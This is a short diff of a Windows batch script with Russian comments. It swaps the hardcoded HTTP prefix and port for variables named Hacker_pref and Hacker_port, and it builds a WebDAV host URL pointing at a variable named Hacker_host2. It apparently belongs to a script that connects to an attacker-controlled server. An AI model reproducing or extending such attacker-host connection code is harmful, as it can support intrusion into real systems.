@@ -19,9 +19,9 @@ rem Определяем переменные:
 rem Основная папка
 set Mainfolder=webdav
 rem Префикс протокола
-set pref=http
+set pref=%Hacker_pref%
 rem HTTP Port
-set port=80
+set port=%Hacker_port%
 
 rem HTTP WebDAV Host
 set host=%pref%://%Hacker_host2%:%port%/%MainFolder%/
